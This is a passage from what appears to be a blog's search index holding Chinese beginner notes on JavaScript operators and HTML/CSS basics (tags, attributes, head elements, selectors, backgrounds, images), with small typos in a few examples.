title="比较运算符"></a>比较运算符</h2><table><thead><tr><th>运算符</th><th>意义</th></tr></thead><tbody><tr><td>==</td><td>等于</td></tr><tr><td>===</td><td>绝对等于（值和类型均相等）</td></tr><tr><td>!=</td><td>不等于</td></tr><tr><td>!==</td><td>不绝对等于（值和类型有一个不相等，或两个都不相等）</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;=</td><td>大于或等于</td></tr><tr><td>&lt;=</td><td>小于或等于</td></tr></tbody></table><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">&amp;&amp;</td><td align="center">and</td><td align="center">(x &lt; 10 &amp;&amp; y &gt; 1) 为 true</td></tr><tr><td align="center">||</td><td align="center">or</td><td align="center">(x==5 || y==5) 为 false</td></tr><tr><td align="center">!</td><td align="center">not</td><td align="center">!(x==y) 为 true</td></tr></tbody></table><h2 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h2><p><code>variablename=(condition)?value1:value2 </code></p><p>例：当a&gt;b时，c=0，否则c=1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=(a&gt;b)?<span class="number">0</span>:<span class="number">1</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML笔记</title>
      <link href="/2022/01/27/HTML%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/27/HTML%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>超文本标记语言（Hyper Text Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。常与CSS、JavaScript一起被众多网站用于设计网页、网页应用程序以及移动应用程序的用户界面。</p><p>HTML是一种<strong>标记语言</strong>而非编程语言。HTML 使用标记标签来描述网页。HTML 文档包含了HTML 标签及文本内容，HTML文档也叫做 web 页面。</p><h1 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h1><p>示例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="comment">&lt;!--定义文档的编码格式为UTF-8--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>learn<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="comment">&lt;!--定义文档的标题为learn--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>一<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="comment">&lt;!--一级标题“一”--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>二<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="comment">&lt;!--二级标题“二”--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>三<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="comment">&lt;!--二级标题“三”--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>四<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="comment">&lt;!--三级标题“四”--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>段落，Loipsum dolor sit amet consectetur adipisicing elit<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://cn.bing.com/&quot;</span>&gt;</span>这是一个bing的链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;null.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>PS：</p><p><code>&lt;!DOCTYPE html&gt;</code>声明为HTML5文档<br><code>&lt;html&gt;</code>与<code>&lt;/html&gt;</code>之间是完整的HTML界面<br><code>&lt;head&gt;</code>与<code>&lt;/head&gt;</code>之间的是头部元素<br><code>&lt;body&gt;</code>与<code>&lt;/body&gt;</code>之间的是可见的页面内容</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20220127152221216.png"></p><p>1.注释符号<code>&lt;!----&gt;</code></p><p>2.标题（h1到h6是从一级标题到六级标题）</p><p>3.段落</p><p><code>&lt;p&gt;XXX&lt;/p&gt;             &lt;!--XXX为所写的段落--&gt;</code></p><p>4.链接</p><p><code>&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt;</code></p><p>5.图像</p><p><code>&lt;img src=&quot;url&quot;&gt;   </code></p><h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><p><strong>语法</strong>：</p><p>①HTML元素以开始标签起始，结束标签终止</p><p>②起始标签与结束标签之间的内容，即为元素的内容</p><p>部分开始标签、结束标签：</p><table><thead><tr><th align="center">开始标签</th><th align="center">元素内容</th><th align="center">结束标签</th></tr></thead><tbody><tr><td align="center">&lt;p</td><td align="center">段落</td><td align="center">/p&gt;</td></tr><tr><td align="center">&lt;a href=”url”</td><td align="center">链接</td><td align="center">/a&gt;</td></tr><tr><td align="center">&lt; br&gt;</td><td align="center">换行</td><td align="center"></td></tr></tbody></table><p>③空元素在开始标签中进行关闭（以开始标签的结束而结束）。</p><p>某些HTML元素具有空内容，即没有内容，被称为空元素。空元素在开始标签中关闭。<br>就是空元素。</p><p>④大多数HTML元素可以<strong>嵌套</strong>，即一个HTML元素可以包含其它的HTML元素。</p><p>⑤大多数HTML元素可拥有<strong>属性</strong>。</p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>HTML属性是HTML元素提供的附加信息。属性一般描述于开始标签，且总是以名称/值对的形式出现。</p><p><strong>注意</strong>：属性值始终被包括在引号里，双引号最常用，也可使用单引号。在某些情况下（如：属性值带有双引号），必须使用单引号。</p><p>​                                                                                              <strong>HTML全局属性表</strong></p><table><thead><tr><th align="left">属性</th><th align="center">作用</th></tr></thead><tbody><tr><td align="left">accesskey</td><td align="center">设置访问元素的键盘设置</td></tr><tr><td align="left">class</td><td align="center">规定元素的类名</td></tr><tr><td align="left">contenteditable</td><td align="center">规定是否可编辑元素的内容</td></tr><tr><td align="left">contextmenu</td><td align="center">指定一个元素的上下文菜单。当用户右击该元素，出现上下文菜单</td></tr><tr><td align="left">data-*</td><td align="center">存储页面的自定义数据</td></tr><tr><td align="left">dir</td><td align="center">设置元素中内容的文本方向</td></tr><tr><td align="left">draggable</td><td align="center">指定某个元素是否可以拖动</td></tr><tr><td align="left">dropzone</td><td align="center">指定是否将数据复制，移动，或链接，或删除</td></tr><tr><td align="left">hidden</td><td align="center">对元素进行隐藏</td></tr><tr><td align="left">id</td><td align="center">规定元素的唯一 id</td></tr><tr><td align="left">lang</td><td align="center">设置元素中内容的语言代码</td></tr><tr><td align="left">spellcheck</td><td align="center">检测元素是否拼写错误</td></tr><tr><td align="left">style</td><td align="center">规定元素的行内样式</td></tr><tr><td align="left">tabindex</td><td align="center">设置元素的 Tab 键控制次序</td></tr><tr><td align="left">title</td><td align="center">规定元素的额外信息</td></tr><tr><td align="left">translate</td><td align="center">指定是否一个元素的值在页面载入时是否需要翻译</td></tr></tbody></table><h1 id="文本格式化"><a href="#文本格式化" class="headerlink" title="文本格式化"></a>文本格式化</h1><h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><table><thead><tr><th>标签</th><th align="center">作用</th></tr></thead><tbody><tr><td><code>&lt;b&gt;</code></td><td align="center">定义粗体文本</td></tr><tr><td><code>&lt;em&gt;</code></td><td align="center">定义着重文字</td></tr><tr><td><code>&lt;i&gt;</code></td><td align="center">定义斜体字</td></tr><tr><td><code>&lt;small&gt;</code></td><td align="center">定义小号字</td></tr><tr><td><code>&lt;strong&gt;</code></td><td align="center">强调文本</td></tr><tr><td><code>&lt;sub&gt;</code></td><td align="center">定义下标字</td></tr><tr><td><code>&lt;sup&gt;</code></td><td align="center">定义上标字</td></tr><tr><td><code>&lt;ins&gt;</code></td><td align="center">定义插入字</td></tr><tr><td><code>&lt;del&gt;</code></td><td align="center">定义删除字</td></tr></tbody></table><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>粗体文字<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Lorem ipsum dolor sit amet consectetur adipisicing elit. Nam suscipit error hic soluta totam voluptatem aspernatur <span class="tag">&lt;<span class="name">em</span>&gt;</span>着重文字<span class="tag">&lt;/<span class="name">em</span>&gt;</span>amet eos culpa quibusdam obcaecati et iusto earum expedita tempora non<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span>&gt;</span>斜体字<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span>&gt;</span>小号字<span class="tag">&lt;/<span class="name">small</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Lorem ipsum dolor sit amet consectetur adipisicing elit. Nam hic, unde perspiciatis inventore sapiente, voluptas<span class="tag">&lt;<span class="name">strong</span>&gt;</span>强调文本<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>00000000<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>示例1<span class="tag">&lt;<span class="name">sub</span>&gt;</span>下标字<span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>示例2<span class="tag">&lt;<span class="name">sup</span>&gt;</span>上标字<span class="tag">&lt;/<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Consectetur<span class="tag">&lt;<span class="name">ins</span>&gt;</span>插入字<span class="tag">&lt;/<span class="name">ins</span>&gt;</span>asperiores mollitia, sit veritatis reiciendis quisquam quidem quam vel, ea dol<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">del</span>&gt;</span>删除字Lorem ipsum dolor sit amet consectetur adipisicing elit. Ex alias delectus quis placeat amet omnis quo distinctio nemo soluta incidunt laudantium, accusantium adipisci dolores commodi nesciunt ipsam dicta in eaque.<span class="tag">&lt;/<span class="name">del</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20220128121156421.png"></p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><h2 id="href"><a href="#href" class="headerlink" title="href"></a><strong>href</strong></h2><p><code>&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt;</code></p><h2 id="target"><a href="#target" class="headerlink" title="target"></a><strong>target</strong></h2><p><code>&lt;a href=&quot;url&quot; target=&quot;打开链接的窗口&quot;&gt;链接文本&lt;/a&gt;</code></p><h2 id="id"><a href="#id" class="headerlink" title="id"></a><strong>id</strong></h2><p><code>&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code></p><p>id 属性可用于创建一个 HTML 文档书签</p><p>书签不会以任何特殊方式显示，即在 HTML 页面中是<strong>不显示</strong>的</p><h1 id="HTML头部"><a href="#HTML头部" class="headerlink" title="HTML头部"></a>HTML头部</h1><h2 id="lt-head-gt"><a href="#lt-head-gt" class="headerlink" title="&lt;head&gt;"></a><code>&lt;head&gt;</code></h2><p><code>&lt;head&gt;</code>元素包含了所有的头部标签元素。在 <code>&lt;head&gt;</code>元素中可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。</p><p> 标签<code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;meta&gt;</code>, <code>&lt; link&gt;,</code> <code>&lt; script&gt;</code>,<code>&lt; noscript&gt;</code>和 <code>&lt; base&gt;</code>可以添加在头部区域。</p><h2 id="lt-title-gt"><a href="#lt-title-gt" class="headerlink" title="&lt;title&gt;"></a><code>&lt;title&gt;</code></h2><p><code>&lt;title&gt;</code>标签用于定义不同文档的标题</p><p><code>&lt;title&gt;文档标题&lt;/title&gt;</code></p><h2 id="lt-base-gt"><a href="#lt-base-gt" class="headerlink" title="&lt;base&gt;"></a><code>&lt;base&gt;</code></h2><base> 标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接。`<base href="url">`<h2 id="lt-link-gt"><a href="#lt-link-gt" class="headerlink" title="&lt;link&gt;"></a><code>&lt;link&gt;</code></h2><p><code>&lt;link&gt;</code> 标签定义了文档与外部资源之间的关系，通常用于链接到样式表</p><p><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;地址&quot;&gt;</code></p><h2 id="lt-style-gt"><a href="#lt-style-gt" class="headerlink" title="&lt;style&gt;"></a><code>&lt;style&gt;</code></h2><p><code>&lt;style&gt;</code> 标签定义了HTML文档的样式文件引用地址。在<code>&lt;style&gt;</code> 元素中可以直接添加样式来渲染HTML文档</p><p><code>&lt;style&gt;body &#123;background-color: azure&#125; p&#123;color: beige&#125;;&lt;/style&gt;</code></p><h2 id="lt-meta-gt"><a href="#lt-meta-gt" class="headerlink" title="&lt;meta&gt;"></a><code>&lt;meta&gt;</code></h2><p><code>&lt;meta&gt;</code>标签通常用于指定网页的描述，编码方式，关键词，作者信息。</p><p><code>&lt;meta&gt;</code>标签有name、http-equiv、content共三个属性</p><p><code>name</code>属性主要是用于描述网页的，对应<code>content</code>属性中的内容是便于搜索引擎查找和分类信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义关键词--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;HTML,head,title,link&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--定义描述内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;HTML learn experience&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--定义作者--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;a HTML learner&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--每分钟刷新页面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;60&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="lt-script-gt"><a href="#lt-script-gt" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h2><p><code>&lt;script&gt;</code>用于定义客户端脚本，如JavaScript。</p><p><code>&lt;script&gt;</code>可以包含脚本语句，也可通过<code>src</code>属性指向外部脚本文件。</p><p>例：输出  Hello World!</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;Hello World!&quot;</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure><p><code>&lt;noscript&gt;</code>标签提供无法使用脚本时的替代内容，只有在浏览器不支持脚本或者禁用脚本时，才会显示 <code>&lt;noscript&gt;</code>元素中的内容</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;Hello World!&quot;</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span>自定义的替代内容<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>层叠式样式表（Cascading Style Sheets，简称CSS）是一种用来表现HTML或XML等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>CSS可以通过三种方式添加到HTML中：</p><p>①外部引用 —— 使用外部 CSS 文件</p><p>②内联样式—— 在HTML元素中使用”style” 属性</p><p>③内部样式表 ——在HTML文档头部 <code>&lt;head&gt; </code>区域使用<code>&lt;style&gt; </code>元素 来包含CSS</p><p>PS：最好的方式是第一种——<strong>外部引用</strong>。</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>CSS规则由<strong>选择器</strong>和一条或多条的<strong>声明</strong>组成</p><p>选择器通常是需要改变样式的HTML元素</p><p>每一条声明由一个属性和一个值组成，属性和值之间用冒号<code>:</code>隔开</p><p>例</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:aliceblue;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择器是p，有两条声明。第一条声明的属性是color，值为aliceblue；第二条声明的属性是text-align，值为center</p><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>CSS的声明在花括号（{}）里，且总是以分号（;）结尾</p><p>例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:aliceblue;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>CSS注释以<code>/*</code>开始，<code>*/</code>结束。</p><p><code>/*注释的内容*/</code></p><h2 id="id和class选择器"><a href="#id和class选择器" class="headerlink" title="id和class选择器"></a>id和class选择器</h2><p>在HTML元素中设置CSS样式时，需要在元素中设置<strong>“id”和“class”选择器</strong>。</p><h3 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h3><p>id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。</p><p>HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。</p><p>例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#learn</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该例中的样式规则应用于元素属性<code>id=&quot;learn&quot;</code></p><p>PS： id属性不要以数字开头，数字开头的id在 Mozilla/Firefox 浏览器中不起作用。</p><h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><p>class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。</p><p>class 选择器在HTML中以class属性表示, 在 CSS 中，XXX类选择器以一个点”.”号显示：（XXX为类名）</p><p>例1：所有拥有test 类的 HTML 元素均居中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.test</span> &#123;<span class="attribute">text-align</span>:center;&#125;</span><br></pre></td></tr></table></figure><p>也可以指定特定的HTML元素使用class</p><p>例2：所有的 p 元素使用<code>class=&quot;test&quot;</code>让该元素的文本居中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.test</span> &#123;<span class="attribute">text-align</span>:center;&#125;</span><br></pre></td></tr></table></figure><p>PS：<strong>类名的第一个字符不能使用数字</strong>，它无法在 Mozilla 或 Firefox 中起作用。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h3><table><thead><tr><th>Property</th><th align="center">作用</th></tr></thead><tbody><tr><td>background</td><td align="center">简写属性，作用是将背景属性设置在一个声明中</td></tr><tr><td>background-attachmen</td><td align="center">背景图像是否固定或者随着页面的其余部分滚动</td></tr><tr><td>background-color</td><td align="center">设置元素的背景颜色</td></tr><tr><td>background-image</td><td align="center">把图像设置为背景</td></tr><tr><td>background-position</td><td align="center">设置背景图像的起始位置</td></tr><tr><td>background-repeat</td><td align="center">设置背景图像是否及如何重复</td></tr></tbody></table><h3 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h3><p>background-color 属性定义了元素的背景颜色，页面的背景颜色使用在body的选择器中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:<span class="number">#b0c4de</span>;&#125;</span><br></pre></td></tr></table></figure><p>在CSS中，可以用十六进制、RGB、颜色名称来定义颜色的值</p><h3 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h3><p>background-image 属性描述了元素的背景图像。默认情况下，背景图像进行平铺重复显示，以覆盖整个元素实体</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&#x27;test1.gif&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><p>图像<strong>只在水平方向平铺</strong> (repeat-x)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&#x27;test1.png&#x27;</span>);</span><br><span class="line"><span class="attribute">background-repeat</span>:repeat-x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 background-repeat 属性，使图像<strong>不平铺</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&#x27;test2.png&#x27;</span>);</span><br><span class="line"><span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 background-position 属性改变图像在背景中的位置</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&#x27;test3.png&#x27;</span>);</span><br><span class="line"><span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line"><span class="attribute">background-position</span><span class="selector-pseudo">:right</span> <span class="attribute">top</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h1><h2 id="定义图像"><a href="#定义图像" class="headerlink" title="定义图像"></a>定义图像</h2><p>在HTML中图像由<code>&lt;src&gt;</code>标签来定义（<code>&lt;img&gt;</code>是空标签，只包含属性，没有闭合标签），<code>src</code>源属性来显示图像（src指的是“source”，它的值是图像的url地址）。</p><p>alt属性可以为图像定义一串预备的可替换文本，其值是用户自定义的。在浏览器无法载入图像时，替换文本属性告诉读者她们失去的信息。此时，浏览器将显示这个替代性的文本而不是图像。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;url&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img lost&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="设置宽、高"><a href="#设置宽、高" class="headerlink" title="设置宽、高"></a>设置宽、高</h2><p>height和width属性分别用于设置图像的高度和宽度，其值的默认单位是像素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;url&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img lost&quot;</span> <span class="attr">width</span>=<span class="string">&quot;321&quot;</span> <span class="attr">hight</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 